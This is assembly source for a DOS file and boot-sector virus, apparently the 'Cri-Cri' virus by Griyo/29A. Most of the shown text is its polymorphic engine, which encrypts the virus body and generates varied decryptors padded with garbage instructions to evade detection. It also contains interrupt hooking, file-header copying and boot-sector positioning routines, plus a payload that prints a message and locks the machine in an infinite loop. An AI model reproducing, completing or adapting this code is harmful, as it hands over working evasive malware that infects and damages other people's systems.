;----------------------------------------------------------------------------
;Encrypt virus body with variable key and generate a
;polymorphic decryptor.
;----------------------------------------------------------------------------
do_encrypt:
        call push_all
;Initialize engine
        xor ax,ax        
        mov word ptr cs:[last_subroutine],ax
        mov word ptr cs:[decrypt_sub],ax
        mov word ptr cs:[last_fill_type],ax
        dec ax
        mov word ptr cs:[last_step_type],ax
        mov byte ptr cs:[last_int_type],al
        mov byte ptr cs:[decrypt_pointer],al
;Choose counter and pointer register
        call get_rnd
        and al,01h
        mov byte ptr cs:[address_register],al
;Choose register for decryption instructions
        call get_rnd
        and al,38h
        mov byte ptr cs:[decrypt_register],al
;Chose segment registers for memory operations
        call get_seg_reg
        mov byte ptr cs:[address_seg_1],al
        call get_seg_reg
        mov byte ptr cs:[address_seg_2],al
;Fill our buffer with garbage
        mov ax,cs
        mov ds,ax
        mov es,ax
        mov di,offset virus_copy
        push di
        mov cx,decryptor
        cld
fill_garbage:
        call get_rnd
        stosb
        loop fill_garbage
        pop di
;Now es:di points to the buffer were engine put polymorphic code
choose_type:       
;Select the type of filler
        mov ax,(end_step_table-step_table)/2 
        call rand_in_range
;Avoid same types in a row
        cmp ax,word ptr cs:[last_step_type]
        je choose_type
        mov word ptr cs:[last_step_type],ax
        add ax,ax
        mov bx,ax
        cld
        call word ptr cs:[step_table+bx]
        cmp byte ptr cs:[decrypt_pointer],05h
        jne choose_type
;Generate some garbage
        call rnd_garbage
;Generate a jump to virus body
        mov al,0E9h
        stosb
        mov ax,decryptor
        mov bx,di
        sub bx,offset virus_copy-02h
        sub ax,bx
        stosw
;Store random crypt value
get_rnd_key:
        call get_rnd
        or al,al
        jz get_rnd_key
        xchg bx,ax
        mov byte ptr cs:[clave_crypt],bl
;Copy virus body to the working area while encrypt
        mov si,offset virus_body
        mov di,offset virus_copy+decryptor
        mov cx,lenvir-decryptor-01h
        cld
load_crypt:
        lodsb
        xor al,bl
        stosb
        loop load_crypt
;Store key without encryption
        movsb        
;Restore all regs and return to infection routine       
        call pop_all
        ret
;-----------------------------------------------------------------------------
;Get a valid opcode for memory operations
;-----------------------------------------------------------------------------
get_seg_reg:
        cmp byte ptr cs:[prog_type],"C"
        je use_ds_es
        mov al,2Eh
        ret
use_ds_es:        
        call get_rnd
        and al,18h
        cmp al,10h
        je get_seg_reg
        or al,26h
        ret
;-----------------------------------------------------------------------------
;Generate next decryptor instruction
;-----------------------------------------------------------------------------
next_decryptor:
;Next instruction counter
        inc byte ptr cs:[decrypt_pointer]
;Check if there is a subroutine witch contains next decryptor instruction
        cmp word ptr cs:[decrypt_sub],0000h
        je build_now
;If so build a call instruction to that subroutine
        call do_call_decryptor
        ret
build_now:
;Else get next instruction to build
        mov bl,byte ptr cs:[decrypt_pointer]
;Generate decryption instructions just into subroutines
        cmp bl,03h
        jne entry_from_sub
;No instruction was created so restore old pointer
        dec byte ptr cs:[decrypt_pointer]
        ret
entry_from_sub:
;Entry point if calling from decryptor subroutine building
        xor bh,bh
        add bx,bx
;Build instruction        
        call word ptr cs:[instruction_table+bx]
        ret
;-----------------------------------------------------------------------------
;Get delta offset
;-----------------------------------------------------------------------------
inst_get_delta:
;Decode a call to next instruction and pop bp
        push di
        mov ax,00E8h
        stosw
        mov ax,5D00h
        stosw
;Generate some garbage
        call rnd_garbage
;Decode a sub bp
        mov ax,0ED81h
        stosw
;Store address of label
        pop ax
        sub ax,offset virus_copy-0103h
no_sub_psp:
        stosw
        ret
;-----------------------------------------------------------------------------
;Load counter register
;-----------------------------------------------------------------------------
inst_load_counter:
        mov al,0BEh
        add al,byte ptr cs:[address_register]
        stosb
;Store size of encrypted data
        mov ax,lenvir-decryptor-01h
        stosw
        ret
;-----------------------------------------------------------------------------
;Load pointer to encrypted data
;-----------------------------------------------------------------------------
inst_load_pointer:
;Load di as pointer
        mov al,0BFh
        sub al,byte ptr cs:[address_register]
        stosb
;Store offset position of encrypted data
        mov ax,offset virus_body
        stosw
;Generate garbage in some cases
        call rnd_garbage
;Generate add reg,bp
        mov ch,byte ptr cs:[address_register]
        mov cl,03h
        rol ch,cl
        mov ax,0FD03h
        sub ah,ch
        stosw
        ret
;-----------------------------------------------------------------------------
;Decrypt one byte from encrypted data
;-----------------------------------------------------------------------------
inst_decrypt_one:
;Decode a mov reg,byte ptr cs:[key][bp]
        mov al,byte ptr cs:[address_seg_1]
        mov ah,8Ah
        stosw
        mov al,byte ptr cs:[decrypt_register]
        or al,86h
        stosb
;Store position of encryption key
        mov ax,offset clave_crypt
        stosw
;Decode a xor byte ptr cs:[si],reg
        mov al,byte ptr cs:[address_seg_2]
        mov ah,30h
        stosw
        mov al,byte ptr cs:[decrypt_register]
        or al,05h
        sub al,byte ptr cs:[address_register]
        stosb
        ret
;-----------------------------------------------------------------------------
;Increment pointer to encrypted zone
;-----------------------------------------------------------------------------
inst_inc_pointer:
        mov al,47h
        sub al,byte ptr cs:[address_register]
        stosb
        ret
;-----------------------------------------------------------------------------
;Decrement counter and loop
;-----------------------------------------------------------------------------
inst_dec_loop:
;Decode a dec reg instruction
        mov al,4Eh
        add al,byte ptr cs:[address_register]
        stosb
;Decode a jz 
        mov al,74h
        stosb
        push di
        inc di
;Generate some garbage instructions
        call rnd_garbage
;Decode a jmp to loop instruction
        mov al,0E9h
        stosb
        mov ax,word ptr cs:[address_loop]
        sub ax,di
        dec ax
        dec ax
        stosw
;Generate some garbage instructions
        call rnd_garbage
;Store jz displacement
        mov ax,di
        pop di
        push ax
        sub ax,di
        dec ax
        stosb
        pop di
        ret
;-----------------------------------------------------------------------------
;Generate some garbage instructions if rnd
;-----------------------------------------------------------------------------
rnd_garbage:
        call get_rnd
        and al,01h
        jz do_rnd_garbage
        ret
do_rnd_garbage:
        call g_generator
        ret
;-----------------------------------------------------------------------------
;Generate a push reg and garbage and pop reg
;-----------------------------------------------------------------------------
do_push_g_pop:
;Build a random push pop
        call do_push_pop
;Get pop instruction
        dec di
        mov al,byte ptr cs:[di+00h]
        push ax
        call g_generator
        pop ax
        stosb
        ret
;-----------------------------------------------------------------------------
;Generate a subroutine witch contains garbage code.
;-----------------------------------------------------------------------------
do_subroutine:
        cmp word ptr cs:[last_subroutine],0000h
        je create_routine
        ret
create_routine:
;Generate a jump instruction
        mov al,0E9h
        stosb
;Save address for jump construction
        push di
;Save address of subroutine
        mov word ptr cs:[last_subroutine],di
;Get subroutine address
        inc di
        inc di        
;Generate some garbage code
        call g_generator
;Insert ret instruction
        mov al,0C3h
        stosb
;Store jump displacement
        mov ax,di
        pop di
        push ax
        sub ax,di
        dec ax
        dec ax
        stosw
        pop di
        ret
;-----------------------------------------------------------------------------
;Generate a subroutine witch contains one decryptor instruction
;-----------------------------------------------------------------------------
sub_decryptor:
        cmp word ptr cs:[decrypt_sub],0000h
        je ok_subroutine
        ret
ok_subroutine:
;Do not generate the loop branch into a subroutine
        mov bl,byte ptr cs:[decrypt_pointer]
        inc bl
        cmp bl,05h
        jne no_loop_sub
        ret
no_loop_sub:
;Generate a jump instruction
        mov al,0E9h
        stosb
;Save address for jump construction
        push di
;Save address of subroutine
        mov word ptr cs:[decrypt_sub],di
        inc di
        inc di        
        push bx
        call rnd_garbage
        pop bx
        call entry_from_sub
        call rnd_garbage
build_return:
;Insert ret instruction
        mov al,0C3h
        stosb
;Store jump displacement
        mov ax,di
        pop di
        push ax
        sub ax,di
        dec ax
        dec ax
        stosw
        pop di
        ret
;-----------------------------------------------------------------------------
;Generate a call instruction to a subroutine witch contains
;next decryptor instruction
;-----------------------------------------------------------------------------
do_call_decryptor:
        cmp byte ptr cs:[decrypt_pointer],03h
        jne no_store_call
;Save position        
        mov word ptr cs:[address_loop],di
no_store_call:
;Build a call to our subroutine
        mov al,0E8h
        stosb
        mov ax,word ptr cs:[decrypt_sub]
        sub ax,di
        stosw
;Do not use this subrotine again
        mov word ptr cs:[decrypt_sub],0000h
        ret
;-----------------------------------------------------------------------------
;Generate a call instruction to a subroutine witch some garbage code
;-----------------------------------------------------------------------------
do_call_garbage:
        mov cx,word ptr cs:[last_subroutine]
;Check if there is a subroutine to call
        or cx,cx
        jnz ok_call
;No, so exit
        ret
ok_call:
;Build a call to our garbage subroutine
        mov al,0E8h
        stosb
        mov ax,cx
        sub ax,di
        stosw
;Do not use this subrotine again
        mov word ptr cs:[last_subroutine],0000h
        ret
;-----------------------------------------------------------------------------
;Generate a branch followed by some garbage code
;-----------------------------------------------------------------------------
do_branch:
;Generate a random conditional jump instruction
        call get_rnd
        and al,07h
        or al,70h
        stosb
;Save address for jump construction
        push di
;Get subroutine address
        inc di
;Generate some garbage code
        call g_generator
;Store jump displacement
        mov ax,di
        pop di
        push ax
        sub ax,di
        dec ax
        stosb
        pop di
        ret
;-----------------------------------------------------------------------------
;Lay down between 2 and 5 filler opcodes selected from the available
;types
;-----------------------------------------------------------------------------
g_generator:                        
;Get a random number for fill count                
        call get_rnd   
        and ax,03h     
;Min 2, max 5 opcodes
        inc ax
        inc ax         
next_fill:      
        push ax
new_fill:       
;Select the type of filler
        mov ax,(end_op_table-op_table)/2 
        call rand_in_range                
;Avoid same types in a row
        cmp ax,word ptr cs:[last_fill_type]
        je new_fill      
        mov word ptr cs:[last_fill_type],ax
        add ax,ax
        mov bx,ax
        call word ptr cs:[op_table+bx]
        pop ax
        dec ax
        jnz next_fill
        ret
;-----------------------------------------------------------------------------
;Makes an opcode of type mov reg,immediate value
;either 8 or 16 bit value
;but never ax or al or sp,di,si or bp
;-----------------------------------------------------------------------------
move_imm:
        call get_rnd
;Get a reggie      
        and al,0Fh  
;Make it a mov reg,
        or al,0B0h   
        test al,00001000b
        jz is_8bit_mov
;Make it ax,bx cx or dx
        and al,11111011b 
        mov ah,al
        and ah,03h
;Not ax or al
        jz move_imm           
        stosb
        call rand_16
        stosw
        ret
is_8bit_mov:
        mov bh,al   
;Is al?
        and bh,07h  
;Yeah bomb
        jz move_imm 
        stosb
        call get_rnd
        stosb
        ret
;-----------------------------------------------------------------------------
;Now we knock boots with mov reg,reg's
;but never to al or ax.
;-----------------------------------------------------------------------------
move_with_reg:
        call rand_16
;Preserve reggies and 8/16 bit    
        and ax,0011111100000001b  
;Or it with addr mode and make it mov
        or  ax,1100000010001010b  
reg_test:
        test al,1
        jz is_8bit_move_with_reg
;Make source and dest = ax,bx,cx,dx    
        and ah,11011011b         
is_8bit_move_with_reg:
        mov bl,ah
        and bl,00111000b
;No mov ax, 's please    
        jz move_with_reg       
;Let's see if 2 reggies are same reggies.    
        mov bh,ah              
        sal bh,1
        sal bh,1
        sal bh,1
        and bh,00111000b
;Check if reg,reg are same
        cmp bh,bl              
        jz move_with_reg
        stosw
        ret
;-----------------------------------------------------------------------------
;Modify a mov reg,reg into an xchg reg,reg
;-----------------------------------------------------------------------------
reg_exchange:
;Make a mov reg,reg
        call move_with_reg  
;But then remove it
        dec di              
;And take advantage of the fact the opcode is still in ax  
        dec di         
;Was a 16 bit type?
        test al,1b        
;Yeah go for an 8 bitter
        jnz reg_exchange  
        mov bh,ah
;Is one of reggies ax?
        and bh,07h         
;Yah so bomb
        jz reg_exchange    
;Else make it xchg ah,dl etc...
        mov al,10000110b   
        stosw
        ret
;-----------------------------------------------------------------------------
;We don't have to watch our stack if we pair up pushes with pops
;so I slapped together this peice of shoddy work to add em.
;-----------------------------------------------------------------------------
do_push_pop:        
        mov ax,(end_bytes_2-bytes_2)/2
        call rand_in_range
        add ax,ax
        mov bx,ax
;Generate push and pop instruction
        mov ax,word ptr cs:[bytes_2+bx]
        stosw
        ret
;-----------------------------------------------------------------------------
;Generate a random int 21h call.
;-----------------------------------------------------------------------------
do_int_21h:
;Do not generate int 21h calls into boot sectore decryptor
        cmp byte ptr cs:[prog_type],"B"
        je no_generate_int
;Do not generate int 21h calls into decryption loop
        cmp byte ptr cs:[decrypt_pointer],02h
        jb no_in_loop
no_generate_int:
        ret
no_in_loop:
        call get_rnd
;Choose within ah,function or ax,function+subfunction
        and al,01h
        jz do_int_ax
do_int_ah:
        mov ax,end_ah_table-ah_table
        call rand_in_range
        mov bx,ax
        mov ah,byte ptr cs:[ah_table+bx]
;Do not generate same int's in a row
        cmp ah,byte ptr cs:[last_int_type]
        jz do_int_ah
;Generate mov ah,function        
        mov byte ptr cs:[last_int_type],ah
        mov al,0B4h
        stosw
;Generate int 21h        
        mov ax,021CDh
        stosw
        ret
do_int_ax:
        mov ax,(end_ax_table-ax_table)/2
        call rand_in_range
        add ax,ax
        mov bx,ax
        mov ax,word ptr cs:[ax_table+bx]
;Do not generate same int's in a row
        cmp ah,byte ptr cs:[last_int_type]
        jz do_int_ax
        mov byte ptr cs:[last_int_type],ah
;Generate mov ax,function
        mov byte ptr es:[di+00h],0B8h
        inc di
        stosw
;Generate int 21h        
        mov ax,021CDh
        stosw
        ret
;-----------------------------------------------------------------------------
;Simple timer based random numbers but with a twist using xor of last one.
;-----------------------------------------------------------------------------
get_rnd:
        in ax,40h
        xor ax, 0FFFFh
        org $-2
Randomize       dw 0000h
        mov [Randomize],ax
        ret
;-----------------------------------------------------------------------------
;A small variation to compensate for lack of randomocity in the
;high byte of 16 bit result returned by get_rnd.
;-----------------------------------------------------------------------------
rand_16:
        call get_rnd
        mov bl,al
        call get_rnd
        mov ah,bl
        ret
;-----------------------------------------------------------------------------
;Generate a random number betwin 0 and ax.
;-----------------------------------------------------------------------------
rand_in_range:  
;Returns a random num between 0 and entry ax
        push bx      
        push dx
        xchg ax,bx
        call get_rnd
        xor dx,dx
        div bx
;Remainder in dx
        xchg ax,dx  
        pop dx
        pop bx
        ret
;----------------------------------------------------------------------------
;Return the al vector in es:bx
;----------------------------------------------------------------------------
get_int:
        push ax
        xor ah,ah
        rol ax,1
        rol ax,1
        xchg bx,ax
        xor ax,ax
        mov es,ax
        les bx,dword ptr es:[bx+00h]
        pop ax
        ret
;----------------------------------------------------------------------------
;Set al interrupt vector to ds:dx pointer
;----------------------------------------------------------------------------
set_int:
        push ax
        push bx
        push ds
        cli
        xor ah,ah
        rol ax,1
        rol ax,1
        xchg ax,bx
        push ds
        xor ax,ax
        mov ds,ax
        mov word ptr ds:[bx+00h],dx
        pop word ptr ds:[bx+02h]
        sti
        pop ds
        pop bx
        pop ax
        ret
;----------------------------------------------------------------------------
;Print message to screen
;----------------------------------------------------------------------------
print_credits:
;Set VGA video mode 03h
        push bp
        mov ax,0003h
        int 10h
;Print string
        mov ax,1301h
        mov bx,0002h
        mov cx,003Ah
        mov dx,0A0Bh
        push cs
        pop es
        pop bp
        add bp,offset text_birthday
        int 10h
exit_print:
;Infinite loop
        jmp exit_print
;----------------------------------------------------------------------------
;Get sft address in es:di
;----------------------------------------------------------------------------
get_sft:
;File handle in bx
        push bx
;Get job file table entry to es:di
        mov ax,1220h
        int 2Fh
        jc error_sft
;Exit if handle not opened
        xor bx,bx
        mov bl,byte ptr es:[di+00h]
        cmp bl,0FFh
        je error_sft
;Get address of sft entry number bx to es:di
        mov ax,1216h
        int 2Fh
        jc error_sft
        pop bx
        stc
        cmc
        ret
;Exit with error
error_sft:
        pop bx
        stc
        ret
;----------------------------------------------------------------------------
;Seek to end of file
;----------------------------------------------------------------------------
seek_end:        
        call get_sft
        mov ax,word ptr es:[di+11h]
        mov dx,word ptr es:[di+13h]
        mov word ptr es:[di+17h],dx
        mov word ptr es:[di+15h],ax
        ret
;----------------------------------------------------------------------------
;Seek to beginning
;----------------------------------------------------------------------------
seek_begin:
        call get_sft
        xor ax,ax
        mov word ptr es:[di+17h],ax
        mov word ptr es:[di+15h],ax
        ret
;----------------------------------------------------------------------------
;Virus CRITICAL ERROR interrupt handler
;----------------------------------------------------------------------------
my_int24h:
        sti
        ;Return error in function
        mov al,3
        iret
;----------------------------------------------------------------------------
;Save all registers in the stack
;----------------------------------------------------------------------------
push_all:
        cli
        pop cs:[ret_off]
        pushf
        push ax
        push bx
        push cx
        push dx
        push bp
        push si
        push di
        push es
        push ds
        push cs:[ret_off]
        sti
        ret
;----------------------------------------------------------------------------
;Restore all registers from the stack
;----------------------------------------------------------------------------
pop_all:
        cli
        pop cs:[ret_off]
        pop ds
        pop es
        pop di
        pop si
        pop bp
        pop dx
        pop cx
        pop bx
        pop ax
        popf
        push cs:[ret_off]
        sti
        ret
;----------------------------------------------------------------------------
;Clear some registers before returning to host
;----------------------------------------------------------------------------
zero_all:
        xor ax,ax
        xor bx,bx
        xor cx,cx
        xor dx,dx
        xor di,di
        xor si,si
        xor bp,bp
        ret
;----------------------------------------------------------------------------
;Unhook int 03h and int 24h and clear dos infection switch
;----------------------------------------------------------------------------
unhook_ints:
        push ds
        push dx
        push ax
        mov byte ptr cs:[running_sw],"R"
        lds dx,dword ptr cs:[old03h]
        mov al,03h
        call set_int
        lds dx,dword ptr cs:[old24h]
        mov al,24h
        call set_int
        pop ax
        pop dx
        pop ds
        ret
;----------------------------------------------------------------------------
;Get position of code inserted into boot sector
;----------------------------------------------------------------------------
get_position:
        mov ah,0
        mov al,byte ptr es:[bx+01h]
        inc ax
        inc ax
        mov di,bx
        add di,ax
        ret
;----------------------------------------------------------------------------
;Make a copy of file header
;----------------------------------------------------------------------------
copy_header:
;Copy header to buffer
        call push_all
        push cs
        pop es
        mov si,offset file_buffer
        mov di,offset old_header
        mov cx,0019h
        cld
        rep movsb
        call pop_all
        ret
;----------------------------------------------------------------------------
;Polymorphic generator data buffer
;----------------------------------------------------------------------------
ah_table:
;This table contains the int 21h garbage functions
        db 00Bh         ;Read entry state
        db 019h         ;Get current drive
        db 02Ah         ;Get current date
        db 02Ch         ;Get current time
        db 030h         ;Get dos version number
        db 062h         ;Get psp address
end_ah_table:
ax_table:
        dw 3300h        ;Get break-flag
        dw 3700h        ;Get line-command separator
        dw 5800h        ;Get mem concept
        dw 5802h        ;Get umb insert
        dw 6501h        ;Get code-page
end_ax_table:
;Push and pop pairs
bytes_2:
        push ax
        pop dx
        push ax
        pop bx
        push ax
        pop cx
        push bx
        pop dx
        push bx
        pop cx
        push cx
        pop bx
        push cx
        pop dx
end_bytes_2:
;Steps table
step_table:       
        dw offset do_subroutine
        dw offset do_call_garbage
        dw offset g_generator
        dw offset do_branch
        dw offset sub_decryptor
        dw offset next_decryptor
        dw offset do_push_g_pop
end_step_table:
instruction_table:
        dw offset inst_get_delta
        dw offset inst_load_counter
        dw offset inst_load_pointer
        dw offset inst_decrypt_one
        dw offset inst_inc_pointer
        dw offset inst_dec_loop
end_inst_table:
;Address of every op-code generator
op_table:       
        dw offset move_with_reg
        dw offset move_imm     
        dw offset reg_exchange
        dw offset do_push_pop
        dw do_int_21h
end_op_table:
;Misc data
last_fill_type          dw 0
last_int_type           db 0
last_step_type          dw 0000h
last_subroutine         dw 0000h
decrypt_sub             dw 0000h
address_loop            dw 0000h
decrypt_pointer         db 00h
address_register        db 00h
decrypt_register        db 00h
address_seg_1           db 00h
address_seg_2           db 00h
;----------------------------------------------------------------------------
;Virus data buffer
;----------------------------------------------------------------------------
old21h          equ this dword
old21h_off      dw 0000h
old21h_seg      dw 0000h
org21h          equ this dword
org21h_off      dw 0000h
org21h_seg      dw 0000h
old13h          equ this dword
old13h_off      dw 0000h
old13h_seg      dw 0000h
old24h          equ this dword
old24h_off      dw 0000h
old24h_seg      dw 0000h
old03h          equ this dword
old03h_off      dw 0000h
old03h_seg      dw 0000h
read_ptr        equ this dword
read_off        dw 0000h
read_seg        dw 0000h
dos_flag        db 00h
prog_type       db "C"
running_sw      db "R"
stealth_sw      db 00h
dos_function    dw 0000h
ret_off         dw 0000h
today           db 00h
file_offset     dw 0000h
;----------------------------------------------------------------------------
text_birthday   db "Cri-Cri ViRuS by Griyo/29A"
                db " ...Tried, tested, not approved."
;----------------------------------------------------------------------------
file_buffer     db 19h dup (00h)
old_header      db 19h dup (00h)
clave_crypt     db 00h
;----------------------------------------------------------------------------
;Buffer for working area
virus_copy      db  00h
;----------------------------------------------------------------------------
com     ends
        end virus_entry
